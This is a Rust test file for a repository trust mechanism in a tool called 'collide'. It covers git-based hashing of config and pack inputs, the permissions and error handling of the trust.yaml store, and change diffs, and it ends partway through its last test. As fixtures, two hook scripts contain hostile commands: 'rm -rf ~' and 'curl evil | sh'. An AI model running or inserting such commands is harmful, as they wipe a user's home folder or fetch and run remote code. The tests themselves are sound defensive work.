//! Tests for trust (ts-0097-kw): the hash, `trust.yaml` and the diff. Every repository is built by `git` in a temp root
//! with a clean environment (`common::git_repo`), and the store's folder is a folder of that root, so no test reads or
//! writes the real `~/.config/collide/trust.yaml`, the real home, the real git config or a daemon. The loader's and the
//! reader's own git calls clear their environment.

use collide_core::owner::TrustState;
use collide_core::trust::{
    ChangeKind, DiffDetail, FileChangeKind, InputDiff, LineTrust, TrustFile, TrustInput,
    canonical_text, pack_review,
};
use collide_host::board_load::{LoadContext, LoadProblem, LoadedLine, load_line};
use collide_host::builtin_packs::{BuiltinPacks, Environment};
use collide_host::git_objects::GitObjects;
use collide_host::trust::{LineSite, MAX_DIFF_LINES, MAX_FILES_WITH_LINES, StoreError};
use collide_host::trust::{Trust, TrustError, TrustStore};
use std::fs;
use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};

mod common;
use common::git_repo::GitRepo;
use common::{TempRoot, repo_root};

const FERRY_BOARD: &str = "packs:\n  - source: repo:.collide/packs/ferry\n";

fn manifest(name: &str, extra: &str) -> String {
    format!("apiVersion: collide/v0\nname: {name}\n{extra}")
}

fn mode(path: &Path) -> u32 {
    fs::metadata(path).unwrap().permissions().mode() & 0o777
}

/// A line's repository with the cache and an SDK stand-in beside it, and a store in a folder of the same temp root
/// that is not made yet.
struct Fx {
    repo: GitRepo,
    cache: PathBuf,
    sdk: PathBuf,
    bin: PathBuf,
    store_dir: PathBuf,
    trust: Trust,
}

impl Fx {
    fn new() -> Fx {
        let repo = GitRepo::new();
        let cache = repo.root().join("cache");
        let sdk = repo.root().join("sdk-copy");
        let bin = repo.root().join("bin");
        fs::create_dir_all(sdk.join("dist")).unwrap();
        fs::write(
            sdk.join("package.json"),
            "{\"name\":\"@collide/pack-sdk\",\"version\":\"0.1.0\",\"type\":\"module\"}\n",
        )
        .unwrap();
        fs::write(
            sdk.join("dist/index.js"),
            "export const name = 'stand-in'\n",
        )
        .unwrap();
        fs::create_dir(&bin).unwrap();
        let store_dir = repo.root().join("home/.config/collide");
        let trust = Trust::new(TrustStore::new(&store_dir));
        Fx {
            repo,
            cache,
            sdk,
            bin,
            store_dir,
            trust,
        }
    }

    /// A board with the `ferry` repo pack, committed.
    fn basic() -> Fx {
        let fx = Fx::new();
        fx.write(".collide/board.yaml", FERRY_BOARD);
        fx.write(
            ".collide/packs/ferry/pack.yaml",
            &manifest("ferry", "version: 1.0.0\n"),
        );
        fx.write(".collide/packs/ferry/hooks/run.sh", "#!/bin/sh\necho one\n");
        fx.write("README.md", "readme\n");
        fx.commit();
        fx
    }

    fn write(&self, rel: &str, text: &str) {
        self.repo.write(rel, text.as_bytes());
    }

    fn commit(&self) -> String {
        self.repo.commit_all("change")
    }

    fn context(&self) -> LoadContext {
        LoadContext::new(
            self.cache.clone(),
            self.sdk.clone(),
            Environment {
                path: self.bin.clone().into_os_string(),
            },
            BuiltinPacks::new(repo_root().join("packs")),
        )
    }

    fn try_load(&self, rev: &str) -> Result<LoadedLine, Vec<LoadProblem>> {
        load_line(&self.repo.git_dir(), rev, &self.context())
    }

    fn load_at(&self, rev: &str) -> LoadedLine {
        self.try_load(rev).unwrap_or_else(|problems| {
            let texts: Vec<String> = problems.iter().map(ToString::to_string).collect();
            panic!("the load should work:\n{}", texts.join("\n"))
        })
    }

    fn load(&self) -> LoadedLine {
        self.load_at("main")
    }

    fn root(&self) -> String {
        self.repo.work().display().to_string()
    }

    fn hash(&self) -> String {
        self.hash_of(&self.load())
    }

    fn hash_of(&self, line: &LoadedLine) -> String {
        self.trust
            .line_hash(&self.repo.git_dir(), line)
            .unwrap()
            .hash
    }

    fn with_site<T>(&self, ref_name: &str, run: impl FnOnce(&LineSite) -> T) -> T {
        let root = self.root();
        let git_dir = self.repo.git_dir();
        run(&LineSite {
            repo: &git_dir,
            root: &root,
            ref_name,
        })
    }

    fn state(&self, line: &LoadedLine) -> TrustState {
        self.with_site("main", |site| self.trust.trust_state(site, line).unwrap())
    }

    fn trust_line(&self, line: &LoadedLine, hash: &str) -> Result<TrustState, TrustError> {
        self.with_site("main", |site| self.trust.trust(site, line, hash))
    }

    fn changes(&self, line: &LoadedLine) -> Vec<InputDiff> {
        self.with_site("main", |site| {
            self.trust.changes_since_trust(site, line).unwrap()
        })
    }

    fn tree(&self, rev: &str) -> String {
        self.repo.git(&["rev-parse", rev])
    }
}

fn untrusted(hash: &str) -> TrustState {
    TrustState::Untrusted {
        hash: hash.to_string(),
    }
}

fn trusted(hash: &str) -> TrustState {
    TrustState::Trusted {
        hash: hash.to_string(),
    }
}

fn find<'a>(diffs: &'a [InputDiff], name: &str) -> &'a InputDiff {
    diffs
        .iter()
        .find(|diff| diff.change.name == name)
        .unwrap_or_else(|| {
            let names: Vec<&str> = diffs.iter().map(|d| d.change.name.as_str()).collect();
            panic!("no change named {name}; the changes are {names:?}")
        })
}

fn files(diff: &InputDiff) -> &[collide_core::trust::FileDiff] {
    match &diff.detail {
        DiffDetail::Files(files) => files,
        other => panic!("expected files, got {other:?}"),
    }
}

// ---- the hash: what it is of ----

#[test]
fn the_hash_is_git_hash_object_of_the_sorted_inputs_text_and_does_not_change_between_loads() {
    let fx = Fx::basic();
    let line = fx.load();
    let inputs: Vec<TrustInput> = line
        .trust_inputs()
        .into_iter()
        .map(|(name, id)| TrustInput::new(name, id))
        .collect();
    let text = canonical_text(&inputs).unwrap();
    let expected = fx
        .repo
        .git_with_input(&["hash-object", "--stdin"], text.as_bytes());
    assert_eq!(fx.hash_of(&line), expected);
    assert_eq!(fx.hash(), fx.hash());
    assert_eq!(fx.hash().len(), 40);
}

#[test]
fn the_hash_does_not_depend_on_the_machines_paths() {
    let (one, other) = (Fx::basic(), Fx::basic());
    assert_ne!(one.repo.work(), other.repo.work());
    assert_eq!(one.hash(), other.hash());
}

#[test]
fn an_uncommitted_edit_leaves_the_hash_alone_and_a_commit_changes_it() {
    let edits: [(&str, &str); 4] = [
        (
            ".collide/packs/ferry/pack.yaml",
            "apiVersion: collide/v0\nname: ferry\nversion: 2.0.0\n",
        ),
        (".collide/packs/ferry/hooks/run.sh", "#!/bin/sh\necho two\n"),
        (
            ".collide/board.yaml",
            "packs:\n  - source: repo:.collide/packs/ferry\nworkflow: ferry/loop\n",
        ),
        (".collide/config.yaml", "ask: { budget_usd: 0.9 }\n"),
    ];
    for (path, text) in edits {
        let fx = Fx::basic();
        fx.write(".collide/config.yaml", "ask: { budget_usd: 0.5 }\n");
        fx.commit();
        let before = fx.hash();
        fx.write(path, text);
        assert_eq!(fx.hash(), before, "an uncommitted edit of {path}");
        fx.commit();
        assert_ne!(fx.hash(), before, "a committed edit of {path}");
    }
}

#[test]
fn a_new_view_a_changed_view_a_new_profile_and_a_changed_profile_each_change_the_hash() {
    let fx = Fx::basic();
    let profile = fs::read_to_string(repo_root().join("fixtures/profiles/small-fix.yaml")).unwrap();
    let mut seen = vec![fx.hash()];
    let steps: [(&str, String); 4] = [
        (".collide/views/mine.yaml", "# a view\n".to_string()),
        (".collide/views/mine.yaml", "# a changed view\n".to_string()),
        (".collide/profiles/small-fix.yaml", profile.clone()),
        (
            ".collide/profiles/small-fix.yaml",
            profile.replace("sonnet", "opus"),
        ),
    ];
    for (path, text) in steps {
        fx.write(path, &text);
        fx.commit();
        let hash = fx.hash();
        assert!(!seen.contains(&hash), "{path} did not change the hash");
        seen.push(hash);
    }
}

#[test]
fn a_committed_change_to_the_lock_or_the_pointer_file_changes_the_hash() {
    let fx = Fx::new();
    fx.write("tools/collide/board.yaml", "packs: []\n");
    fx.write(".collide", "dir: tools/collide\n");
    fx.commit();
    let before = fx.hash();
    fx.write("tools/collide/packs.lock", "packs: []\n");
    fx.commit();
    let with_lock = fx.hash();
    assert_ne!(with_lock, before);
    fx.write(".collide", "dir: tools/collide\n# a comment\n");
    fx.commit();
    assert_ne!(fx.hash(), with_lock);
}

#[test]
fn a_git_pack_is_covered_through_the_lock() {
    let source = "git:example.invalid/remote//pack@main";
    let fx = Fx::new();
    let remote = GitRepo::new();
    remote.write(
        "pack.yaml",
        manifest("remote", "version: 1.0.0\n").as_bytes(),
    );
    let commit = remote.commit_all("one");
    let tree = remote.git(&["rev-parse", "HEAD^{tree}"]);
    collide_host::pack_cache::materialize(&fx.cache, &fx.sdk, &remote.git_dir(), &tree).unwrap();
    fx.write(
        ".collide/board.yaml",
        &format!("packs:\n  - source: {source}\n"),
    );
    let lock = |commit: &str, tree: &str| {
        format!("packs:\n  - source: {source}\n    commit: {commit}\n    tree: {tree}\n")
    };
    fx.write(".collide/packs.lock", &lock(&commit, &tree));
    fx.commit();
    let line = fx.load();
    let inputs = fx
        .trust
        .line_hash(&fx.repo.git_dir(), &line)
        .unwrap()
        .inputs;
    assert!(inputs.contains(&TrustInput::new(format!("pack {source}"), tree.clone())));

    // A second pack version, in the cache and locked: the tree id in the lock is what the hash follows.
    remote.write(
        "pack.yaml",
        manifest("remote", "version: 2.0.0\n").as_bytes(),
    );
    let commit_two = remote.commit_all("two");
    let tree_two = remote.git(&["rev-parse", "HEAD^{tree}"]);
    collide_host::pack_cache::materialize(&fx.cache, &fx.sdk, &remote.git_dir(), &tree_two)
        .unwrap();
    let before = fx.hash();
    fx.write(".collide/packs.lock", &lock(&commit_two, &tree_two));
    fx.commit();
    assert_ne!(fx.hash(), before);
}

#[test]
fn a_file_the_hash_does_not_cover_changes_nothing() {
    let fx = Fx::basic();
    let before = fx.hash();
    // A committed edit of the README, a committed file outside `.collide`, an empty commit: none is covered.
    fx.write("README.md", "a different readme\n");
    fx.commit();
    assert_eq!(fx.hash(), before, "README.md");
    fx.write("src/main.rs", "fn main() {}\n");
    fx.commit();
    assert_eq!(fx.hash(), before, "a file outside .collide");
    fx.write(".collide/planning/epics/note.md", "a planning note\n");
    fx.commit();
    assert_eq!(fx.hash(), before, "the planning folder");
    fx.repo
        .git(&["commit", "--quiet", "--allow-empty", "--message", "empty"]);
    assert_eq!(fx.hash(), before, "an empty commit");
    // An untracked file and a non-yaml file in a folder the hash reads are not covered either.
    fx.write("untracked.txt", "x\n");
    fx.write(".collide/profiles/notes.txt", "stray\n");
    fx.commit();
    assert_eq!(fx.hash(), before, "a stray file in profiles/");
}

#[test]
fn an_edit_in_the_working_tree_is_not_the_snapshot() {
    let fx = Fx::basic();
    let before = fx.hash();
    fx.write(".collide/board.yaml", "packs: []\n");
    fx.write(".collide/packs/ferry/hooks/run.sh", "#!/bin/sh\nrm -rf ~\n");
    fx.write(".collide/views/new.yaml", "# new\n");
    assert_eq!(fx.hash(), before);
    assert_eq!(fx.state(&fx.load()), untrusted(&before));
}

// ---- the hash: protectedPaths ----

const GUARDED: &str = "protectedPaths:\n  - scripts/**\n  - Makefile\n";

fn guarded() -> Fx {
    let fx = Fx::new();
    fx.write(".collide/board.yaml", FERRY_BOARD);
    fx.write(
        ".collide/packs/ferry/pack.yaml",
        &manifest("ferry", GUARDED),
    );
    fx.write("scripts/build.sh", "#!/bin/sh\nmake\n");
    fx.write("Makefile", "all:\n");
    fx.write("src/lib.rs", "// code\n");
    fx.commit();
    fx
}

#[test]
fn a_change_under_a_protected_folder_or_to_a_protected_file_changes_the_hash() {
    let fx = guarded();
    let before = fx.hash();
    fx.write("scripts/build.sh", "#!/bin/sh\nmake all\n");
    fx.commit();
    let edited = fx.hash();
    assert_ne!(edited, before, "an edit under scripts/");
    fx.write("scripts/deep/new.sh", "#!/bin/sh\n");
    fx.commit();
    let added = fx.hash();
    assert_ne!(added, edited, "a new file under scripts/");
    fx.write("Makefile", "all:\n\techo\n");
    fx.commit();
    assert_ne!(fx.hash(), added, "the protected Makefile");
}

#[test]
fn a_change_outside_the_protected_paths_does_not_change_the_hash() {
    let fx = guarded();
    let before = fx.hash();
    fx.write("src/lib.rs", "// more code\n");
    fx.write("docs/guide.md", "guide\n");
    fx.commit();
    assert_eq!(fx.hash(), before);
}

#[test]
fn a_protected_path_that_appears_or_goes_changes_the_hash() {
    let fx = Fx::new();
    fx.write(".collide/board.yaml", FERRY_BOARD);
    fx.write(
        ".collide/packs/ferry/pack.yaml",
        &manifest("ferry", GUARDED),
    );
    fx.write("src/lib.rs", "// code\n");
    fx.commit();
    let absent = fx.hash();
    fx.write("scripts/build.sh", "#!/bin/sh\n");
    fx.commit();
    let present = fx.hash();
    assert_ne!(present, absent, "the folder appeared");
    fx.repo.git(&["rm", "--quiet", "-r", "scripts"]);
    fx.commit();
    assert_eq!(fx.hash(), absent, "the folder went");
}

#[test]
fn a_protected_glob_with_no_folder_before_its_wildcard_is_hashed_at_the_root() {
    let fx = Fx::new();
    fx.write(".collide/board.yaml", FERRY_BOARD);
    fx.write(
        ".collide/packs/ferry/pack.yaml",
        &manifest("ferry", "protectedPaths:\n  - \"*.lock\"\n"),
    );
    fx.commit();
    let before = fx.hash();
    fx.write("src/lib.rs", "// code\n");
    fx.commit();
    assert_ne!(fx.hash(), before, "never less often than a match would ask");
}

#[test]
fn protected_paths_in_the_mapping_form_are_hashed_too() {
    let fx = Fx::new();
    fx.write(".collide/board.yaml", FERRY_BOARD);
    fx.write(
        ".collide/packs/ferry/pack.yaml",
        &manifest(
            "ferry",
            "protectedPaths: { paths: [\"gates/*\"], at: phase-end }\n",
        ),
    );
    fx.write("gates/a.sh", "one\n");
    fx.commit();
    let before = fx.hash();
    fx.write("gates/a.sh", "two\n");
    fx.commit();
    assert_ne!(fx.hash(), before);
}

// ---- the decision ----

#[test]
fn a_line_nobody_trusted_is_untrusted_at_its_current_hash() {
    let fx = Fx::basic();
    let line = fx.load();
    assert_eq!(fx.state(&line), untrusted(&fx.hash()));
    assert!(!fx.store_dir.exists(), "asking writes nothing");
    assert!(fx.trust.store_problem().is_none());
}

#[test]
fn trust_with_the_shown_hash_stores_it_with_its_inputs_and_the_state_is_trusted() {
    let fx = Fx::basic();
    let line = fx.load();
    let hash = fx.hash_of(&line);
    assert_eq!(fx.trust_line(&line, &hash).unwrap(), trusted(&hash));
    assert_eq!(fx.state(&line), trusted(&hash));

    let stored = fx.trust.store().load().unwrap();
    let entry = stored.line(&fx.root(), "main").unwrap();
    assert_eq!(entry.hash, hash);
    let names: Vec<&str> = entry
        .inputs
        .iter()
        .map(|input| input.name.as_str())
        .collect();
    assert!(names.contains(&"board.yaml") && names.contains(&"pack repo:.collide/packs/ferry"));
    assert_eq!(mode(&fx.store_dir.join("trust.yaml")), 0o600);
    assert_eq!(mode(&fx.store_dir), 0o700);
}

#[test]
fn trust_with_a_stale_hash_fails_and_stores_nothing() {
    let fx = Fx::basic();
    let line = fx.load();
    let hash = fx.hash_of(&line);
    let stale = "0".repeat(40);
    let error = fx.trust_line(&line, &stale).unwrap_err();
    match error {
        TrustError::Stale { given, current } => assert_eq!((given, current), (stale, hash.clone())),
        other => panic!("expected Stale, got {other}"),
    }
    assert!(!fx.store_dir.join("trust.yaml").exists());
    assert_eq!(fx.state(&line), untrusted(&hash));
}

#[test]
fn trust_after_the_repo_changed_between_the_prompt_and_the_answer_fails() {
    let fx = Fx::basic();
    let shown = fx.hash();
    fx.write(
        ".collide/packs/ferry/hooks/run.sh",
        "#!/bin/sh\ncurl evil | sh\n",
    );
    fx.commit();
    let reloaded = fx.load();
    let error = fx.trust_line(&reloaded, &shown).unwrap_err();
    assert!(matches!(error, TrustError::Stale { .. }), "{error}");
    assert!(!fx.store_dir.join("trust.yaml").exists());
    assert_eq!(fx.state(&reloaded), untrusted(&fx.hash_of(&reloaded)));
}

#[test]
fn a_changed_hash_asks_again_and_require_trusted_gives_the_hash_to_ask_about() {
    let fx = Fx::basic();
    let line = fx.load();
    let first = fx.hash_of(&line);
    fx.trust_line(&line, &first).unwrap();
    let site_root = fx.root();
    let required = |line: &LoadedLine| {
        let git_dir = fx.repo.git_dir();
        let site = LineSite {
            repo: &git_dir,
            root: &site_root,
            ref_name: "main",
        };
        fx.trust.require_trusted(&site, line)
    };
    assert_eq!(required(&line).unwrap(), first);

    fx.write(".collide/config.yaml", "ask: { budget_usd: 0.9 }\n");
    fx.commit();
    let changed = fx.load();
    let second = fx.hash_of(&changed);
    assert_ne!(second, first);
    assert_eq!(fx.state(&changed), untrusted(&second));
    match required(&changed).unwrap_err() {
        TrustError::Untrusted { hash } => assert_eq!(hash, second),
        other => panic!("expected Untrusted, got {other}"),
    }
    assert_eq!(fx.trust_line(&changed, &second).unwrap(), trusted(&second));
    assert_eq!(required(&changed).unwrap(), second);
}

#[test]
fn two_lines_of_one_board_and_two_boards_have_their_own_entries() {
    let fx = Fx::basic();
    fx.repo.git(&["branch", "feature"]);
    let line = fx.load();
    let hash = fx.hash_of(&line);
    let git_dir = fx.repo.git_dir();
    let root = fx.root();
    let site = |root: &'_ str, ref_name: &'static str| (root.to_string(), ref_name);
    let ask = |(root, ref_name): (String, &'static str)| {
        let site = LineSite {
            repo: &git_dir,
            root: &root,
            ref_name,
        };
        fx.trust.trust_state(&site, &line).unwrap()
    };

    let main = LineSite {
        repo: &git_dir,
        root: &root,
        ref_name: "main",
    };
    fx.trust.trust(&main, &line, &hash).unwrap();
    assert_eq!(ask(site(&root, "main")), trusted(&hash));
    assert_eq!(
        ask(site(&root, "feature")),
        untrusted(&hash),
        "another line"
    );
    assert_eq!(
        ask(site("/another/board", "main")),
        untrusted(&hash),
        "another board"
    );

    let feature = LineSite {
        repo: &git_dir,
        root: &root,
        ref_name: "feature",
    };
    fx.trust.trust(&feature, &line, &hash).unwrap();
    let other = LineSite {
        repo: &git_dir,
        root: "/another/board",
        ref_name: "main",
    };
    fx.trust.trust(&other, &line, &hash).unwrap();
    let stored = fx.trust.store().load().unwrap();
    assert_eq!(stored.boards.len(), 2);
    assert_eq!(stored.boards[&root].len(), 2);
}

#[test]
fn the_state_is_the_owner_wire_type_through_a_serde_round_trip() {
    let fx = Fx::basic();
    let line = fx.load();
    let hash = fx.hash_of(&line);
    for state in [fx.state(&line), fx.trust_line(&line, &hash).unwrap()] {
        let text = serde_json::to_string(&state).unwrap();
        let back: TrustState = serde_json::from_str(&text).unwrap();
        assert_eq!(back, state);
        assert!(text.contains(&format!("\"hash\":\"{hash}\"")), "{text}");
    }
}

// ---- the store ----

fn store_in(root: &TempRoot) -> TrustStore {
    TrustStore::new(root.join("config/collide"))
}

fn sample() -> TrustFile {
    let mut file = TrustFile::default();
    file.set_line(
        "/work/main-repo",
        "main",
        LineTrust {
            hash: "a".repeat(40),
            inputs: vec![TrustInput::new("board.yaml", "b".repeat(40))],
        },
    );
    file.set_pack("git:example.invalid/p", &"c".repeat(40));
    file.add_dev("/work/dev-pack");
    file
}

#[test]
fn the_store_round_trips_and_a_missing_file_is_empty() {
    let root = TempRoot::new();
    let store = store_in(&root);
    assert_eq!(store.load().unwrap(), TrustFile::default());
    store.save(&sample()).unwrap();
    assert_eq!(store.load().unwrap(), sample());
}

#[test]
fn the_store_makes_its_folder_0700_and_the_file_0600_and_tightens_a_folder_that_was_open() {
    let root = TempRoot::new();
    let store = store_in(&root);
    store.save(&sample()).unwrap();
    assert_eq!(mode(&root.join("config/collide")), 0o700);
    assert_eq!(mode(&store.file()), 0o600);

    let open = TempRoot::new();
    let dir = open.join("collide");
    fs::create_dir(&dir).unwrap();
    fs::set_permissions(&dir, fs::Permissions::from_mode(0o755)).unwrap();
    TrustStore::new(&dir).save(&sample()).unwrap();
    assert_eq!(mode(&dir), 0o700);
}

#[test]
fn a_file_made_0644_by_hand_is_read_and_rewritten_0600() {
    let root = TempRoot::new();
    let store = store_in(&root);
    store.save(&sample()).unwrap();
    fs::set_permissions(store.file(), fs::Permissions::from_mode(0o644)).unwrap();
    assert_eq!(store.load().unwrap(), sample());
    store.save(&sample()).unwrap();
    assert_eq!(mode(&store.file()), 0o600);
}

#[test]
fn a_temp_file_left_by_a_crash_with_open_permissions_does_not_leak_into_the_file() {
    let root = TempRoot::new();
    let store = store_in(&root);
    store.save(&TrustFile::default()).unwrap();
    let leftover = root.join("config/collide/trust.yaml.tmp");
    fs::write(&leftover, "half a file").unwrap();
    fs::set_permissions(&leftover, fs::Permissions::from_mode(0o644)).unwrap();
    store.save(&sample()).unwrap();
    assert_eq!(mode(&store.file()), 0o600);
    assert_eq!(store.load().unwrap(), sample());
    assert!(!leftover.exists());
}

fn bad_store(text: &str) -> (TempRoot, TrustStore) {
    let root = TempRoot::new();
    let store = store_in(&root);
    fs::create_dir_all(root.join("config/collide")).unwrap();
    fs::write(store.file(), text).unwrap();
    (root, store)
}

#[test]
fn a_malformed_a_duplicate_key_and_an_unknown_key_file_are_load_errors_that_name_the_file() {
    let cases = [
        "boards: [unclosed\n",
        "packs: {}\npacks: {}\n",
        "trusted: true\n",
        "boards: nope\n",
    ];
    for text in cases {
        let (_root, store) = bad_store(text);
        let error = store.load().unwrap_err();
        assert!(matches!(error, StoreError::Invalid(_)), "{error}");
        assert!(error.to_string().contains("trust.yaml"), "{error}");
        assert!(
            error
                .to_string()
                .contains(&store.file().display().to_string()),
            "{error}"
        );
    }
}

#[test]
fn a_file_over_the_cap_is_a_load_error_that_names_the_file() {
    let (_root, store) = bad_store(&format!("# {}\n", "x".repeat(300 * 1024)));
    let error = store.load().unwrap_err();
    assert!(error.to_string().contains("trust.yaml"), "{error}");
    assert!(error.to_string().contains("cap"), "{error}");
}

#[test]
fn a_bad_store_is_never_read_as_trusted_and_trust_refuses_to_replace_it() {
    let fx = Fx::basic();
    let line = fx.load();
    let hash = fx.hash_of(&line);
    fx.trust_line(&line, &hash).unwrap();
    let file = fx.store_dir.join("trust.yaml");
    let good = fs::read_to_string(&file).unwrap();
    for text in ["boards: [unclosed\n", "packs: {}\npacks: {}\n"] {
        fs::write(&file, text).unwrap();
        assert_eq!(fx.state(&line), untrusted(&hash));
        let problem = fx.trust.store_problem().expect("the problem is reported");
        assert!(problem.to_string().contains("trust.yaml"), "{problem}");
        let error = fx.trust_line(&line, &hash).unwrap_err();
        assert!(matches!(error, TrustError::Store(_)), "{error}");
        assert_eq!(
            fs::read_to_string(&file).unwrap(),
            text,
            "the person's file is left alone"
        );
        let site_root = fx.root();
        let git_dir = fx.repo.git_dir();
        let site = LineSite {
            repo: &git_dir,
            root: &site_root,
            ref_name: "main",
        };
        assert!(fx.trust.require_trusted(&site, &line).is_err());
    }
    fs::write(&file, good).unwrap();
    assert_eq!(fx.state(&line), trusted(&hash));
}

#[test]
fn a_file_that_would_be_over_the_cap_is_not_written_and_the_old_one_stays() {
    let root = TempRoot::new();
    let store = store_in(&root);
    store.save(&sample()).unwrap();
    let mut huge = sample();
    for n in 0..8_000 {
        huge.add_dev(&format!(
            "/a/folder/with/a/long/enough/path/to/fill/the/file/{n:06}"
        ));
    }
    let error = store.save(&huge).unwrap_err();
    assert!(matches!(error, StoreError::TooLarge { .. }), "{error}");
    assert_eq!(store.load().unwrap(), sample());
}

// ---- the diff ----

#[test]
fn a_repo_pack_change_committed_with_no_lock_edit_is_untrusted_and_the_diff_names_the_pack_and_the_lines()
 {
    let fx = Fx::basic();
    let line = fx.load();
    let first = fx.hash_of(&line);
    fx.trust_line(&line, &first).unwrap();
    assert!(fx.changes(&line).is_empty());

    fx.write(
        ".collide/packs/ferry/pack.yaml",
        &manifest("ferry", "version: 2.0.0\n"),
    );
    fx.commit();
    let changed = fx.load();
    assert_ne!(fx.state(&changed), trusted(&first));
    assert!(matches!(fx.state(&changed), TrustState::Untrusted { .. }));

    let diffs = fx.changes(&changed);
    assert_eq!(diffs.len(), 1, "{diffs:?}");
    let pack = &diffs[0];
    assert_eq!(pack.change.name, "pack repo:.collide/packs/ferry");
    assert_eq!(pack.change.kind, ChangeKind::Changed);
    assert_eq!(
        pack.change.new.as_deref(),
        Some(fx.tree("main:.collide/packs/ferry").as_str())
    );
    let listed = files(pack);
    assert_eq!(listed.len(), 1);
    assert_eq!(listed[0].path, "pack.yaml");
    assert_eq!(listed[0].kind, FileChangeKind::Modified);
    let lines = listed[0].lines.as_ref().unwrap();
    assert!(
        lines.lines.contains(&"-version: 1.0.0".to_string()),
        "{lines:?}"
    );
    assert!(
        lines.lines.contains(&"+version: 2.0.0".to_string()),
        "{lines:?}"
    );
    assert!(!lines.binary && lines.omitted == 0);
}

#[test]
fn a_new_hook_file_and_a_deleted_file_are_listed_in_path_order_with_the_new_files_lines() {
    let fx = Fx::basic();
    let line = fx.load();
    let hash = fx.hash_of(&line);
    fx.trust_line(&line, &hash).unwrap();
    fx.write(".collide/packs/ferry/hooks/new.sh", "#!/bin/sh\necho new\n");
    fx.repo.remove(".collide/packs/ferry/hooks/run.sh");
    fx.commit();
    let diffs = fx.changes(&fx.load());
    let listed = files(find(&diffs, "pack repo:.collide/packs/ferry"));
    let summary: Vec<(&str, FileChangeKind)> = listed
        .iter()
        .map(|file| (file.path.as_str(), file.kind))
        .collect();
    assert_eq!(
        summary,
        vec![
            ("hooks/new.sh", FileChangeKind::Added),
            ("hooks/run.sh", FileChangeKind::Deleted)
        ]
    );
    let added = listed[0].lines.as_ref().unwrap();
    assert!(added.lines.contains(&"+echo new".to_string()), "{added:?}");
    assert!(listed[1].lines.is_none());
}

#[test]
fn a_changed_board_yaml_shows_its_changed_lines_and_a_new_view_shows_its_lines() {
    let fx = Fx::basic();
    let line = fx.load();
    let hash = fx.hash_of(&line);
    fx.trust_line(&line, &hash).unwrap();
    fx.write(
        ".collide/board.yaml",
        &format!("{FERRY_BOARD}workflow: ferry/loop\n"),
    );
    fx.write(".collide/views/mine.yaml", "# a view\n");
    fx.commit();
    let diffs = fx.changes(&fx.load());
    let names: Vec<&str> = diffs.iter().map(|diff| diff.change.name.as_str()).collect();
    assert_eq!(names, vec!["board.yaml", "views/mine.yaml"]);
    match &diffs[0].detail {
        DiffDetail::Lines(lines) => {
            assert!(
                lines.lines.contains(&"+workflow: ferry/loop".to_string()),
                "{lines:?}"
            )
        }
        other => panic!("expected lines, got {other:?}"),
    }
    assert_eq!(diffs[1].change.kind, ChangeKind::Added);
    match &diffs[1].detail {
        DiffDetail::Lines(lines) => assert!(lines.lines.contains(&"+# a view".to_string())),
        other => panic!("expected lines, got {other:?}"),
    }
}

#[test]
fn with_nothing_trusted_every_input_is_added() {
    let fx = Fx::basic();
    let diffs = fx.changes(&fx.load());
    assert!(!diffs.is_empty());
    assert!(
        diffs
            .iter()
            .all(|diff| diff.change.kind == ChangeKind::Added)
    );
    let names: Vec<&str> = diffs.iter().map(|diff| diff.change.name.as_str()).collect();
    let mut sorted = names.clone();
    sorted.sort();
    assert_eq!(names, sorted, "name order");
}

#[test]
fn an_input_whose_old_objects_are_gone_is_listed_as_changed_and_says_so() {
    let fx = Fx::basic();
    let line = fx.load();
    let current = fx
        .trust
        .line_hash(&fx.repo.git_dir(), &line)
        .unwrap()
        .inputs;
    let mut old = current.clone();
    // A pruned clone no longer has these objects.
    for input in &mut old {
        if input.name == "board.yaml" || input.name.starts_with("pack ") {
            input.id = "1".repeat(40);
        }
    }
    let diffs = fx.trust.diff(&fx.repo.git_dir(), &old, &current);
    assert_eq!(diffs.len(), 2);
    for diff in &diffs {
        assert_eq!(diff.change.kind, ChangeKind::Changed);
        match &diff.detail {
            DiffDetail::Unavailable(why) => {
                assert!(why.contains("not in this repository"), "{why}")
            }
            other => panic!("expected Unavailable, got {other:?}"),
        }
    }
}

#[test]
fn a_hand_edited_store_with_a_bad_id_does_not_stop_the_diff() {
    let fx = Fx::basic();
    let current = fx
        .trust
        .line_hash(&fx.repo.git_dir(), &fx.load())
        .unwrap()
        .inputs;
    let old = vec![TrustInput::new("board.yaml", "not-an-id")];
    let diffs = fx.trust.diff(&fx.repo.git_dir(), &old, &current);
    assert!(matches!(
        find(&diffs, "board.yaml").detail,
        DiffDetail::Unavailable(_)
    ));
}

#[test]
fn a_file_diff_shows_the_first_200_changed_lines_and_counts_the_rest() {
    let fx = Fx::basic();
    let numbered =
        |prefix: &str| -> String { (0..300).map(|n| format!("{prefix}{n}\n")).collect() };
    fx.write(".collide/views/long.yaml", &numbered("# old "));
    fx.commit();
    let line = fx.load();
    let hash = fx.hash_of(&line);
    fx.trust_line(&line, &hash).unwrap();
    fx.write(".collide/views/long.yaml", &numbered("# new "));
    fx.commit();
    let diffs = fx.changes(&fx.load());
    let DiffDetail::Lines(lines) = &find(&diffs, "views/long.yaml").detail else {
        panic!("expected lines");
    };
    let changed = lines
        .lines
        .iter()
        .filter(|line| line.starts_with('+') || line.starts_with('-'))
        .count();
    assert_eq!(changed, MAX_DIFF_LINES);
    assert_eq!(lines.omitted, 600 - MAX_DIFF_LINES);
}

#[test]
fn only_the_first_files_of_a_changed_folder_show_their_lines() {
    let fx = Fx::basic();
    let line = fx.load();
    let hash = fx.hash_of(&line);
    fx.trust_line(&line, &hash).unwrap();
    let total = MAX_FILES_WITH_LINES + 5;
    for n in 0..total {
        fx.write(
            &format!(".collide/packs/ferry/hooks/h{n:02}.sh"),
            &format!("echo {n}\n"),
        );
    }
    fx.commit();
    let diffs = fx.changes(&fx.load());
    let listed = files(find(&diffs, "pack repo:.collide/packs/ferry"));
    assert_eq!(listed.len(), total);
    let shown = listed.iter().filter(|file| file.lines.is_some()).count();
    assert_eq!(shown, MAX_FILES_WITH_LINES);
    let last = listed.last().unwrap();
    assert!(last.lines.is_none());
    assert!(
        last.note.as_deref().unwrap_or("").contains("first"),
        "{last:?}"
    );
}

#[test]
fn a_binary_file_and_a_symlink_in_a_changed_folder_say_what_they_are() {
    let fx = Fx::basic();
    let line = fx.load();
    let hash = fx.hash_of(&line);
    fx.trust_line(&line, &hash).unwrap();
    fx.repo
        .write(".collide/packs/ferry/hooks/blob.bin", b"\0\x01\x02\x03");
    fx.commit();
    let diffs = fx.changes(&fx.load());
    let listed = files(find(&diffs, "pack repo:.collide/packs/ferry"));
    let blob = listed
